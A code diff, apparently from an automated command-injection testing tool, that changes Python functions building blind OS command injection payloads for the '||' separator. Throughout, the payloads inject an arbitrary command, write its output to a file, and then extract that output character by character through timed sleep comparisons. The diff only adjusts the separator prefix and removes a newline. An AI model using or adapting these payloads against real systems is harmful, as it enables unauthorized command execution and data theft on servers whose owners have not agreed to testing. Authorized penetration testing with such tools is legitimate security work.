@@ -101,8 +101,8 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request
       separator = urllib.unquote(separator)
 
   elif separator == "||" :
-    payload = (separator + " " +
-              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")\n" + " "
+    payload = ("| " +
+              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + " "
               # Find the length of the output, using readline().
               "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator + " "
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\") "
@@ -195,8 +195,8 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
       separator = urllib.unquote(separator) 
 
   elif separator == "||" :     
-    payload = (separator + " " + 
-              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $("+cmd+"))')\nf.close()\n\")\n" + " "
+    payload = ("| " + 
+              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $("+cmd+"))')\nf.close()\n\")" + " "
               "[ "+ str(j) +" -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator + " "
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
               )                    
@@ -278,7 +278,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, d
       separator = urllib.unquote(separator)
 
   elif separator == "||" :
-    payload = (separator + " " + 
+    payload = ("| " + 
               "[ " + str(ascii_char) + " -ne  $(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(num_of_chars-1)+"])\nexit(0)\") ] " + separator + 
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
               )
@@ -361,7 +361,7 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
       separator = urllib.unquote(separator)
 
   elif separator == "||" :
-    payload = (separator + " " +
+    payload = ("| " +
               "[ " + str(ascii_char) + " -ne  $(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print file.readlines()[0]["+str(num_of_chars-1)+"]\nexit(0)\") ] " + separator + 
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
               )
